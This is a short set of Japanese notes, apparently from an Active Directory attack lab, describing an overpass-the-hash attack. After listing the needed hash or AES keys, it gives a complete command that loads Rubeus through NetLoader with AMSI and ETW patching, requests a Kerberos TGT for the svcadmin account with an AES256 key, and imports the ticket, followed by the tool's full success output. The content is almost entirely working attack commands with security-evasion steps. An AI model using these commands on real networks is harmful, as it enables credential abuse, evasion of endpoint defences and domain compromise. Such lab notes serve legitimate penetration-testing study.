## 攻撃の前提
- 以下のいずれかの情報が必要
	- NTLMハッシュ
	- AES256キー
	- AES128キー

---

## 手法
```
C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Applying amsi patch: true 
[*] Applying etw patch: true 
[*] Decrypting packed exe... 
[!] ~Flangvik - Arno0x0x Edition - #NetLoader 
[+] Patched! 
[+] Starting C:\AD\Tools\Rubeus.exe with args 'asktgt /user:svcadmin 
/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
/opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt' 
   ______        _ 
  (_____ \      | | 
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/ 
 
v2.2.1 
 
[*] Action: Ask TGT 
 
[*] Showing process : True 
[*] Username        : 9BVVCQUM 
[*] Domain          : PWF4Q38I 
[*] Password        : BUTPFQXM 
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with 
LOGON_TYPE = 9 
[+] ProcessID       : 3696 
[+] LUID            : 0x10605d1 
 
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1) 
[!] Pre-Authentication required! 
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin 
[*] Using aes256_cts_hmac_sha1 hash: 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin' 
[*] Target LUID : 17171921 
[*] Using domain controller: 172.16.2.1:88 
[+] TGT request successful! 
[*] base64(ticket.kirbi): doI… 
[snip] 
[+] Ticket successfully imported! 
 
  ServiceName           :  krbtgt/dollarcorp.moneycorp.local 
  ServiceRealm          :  DOLLARCORP.MONEYCORP.LOCAL
  UserName              :  svcadmin 
[snip] 
```

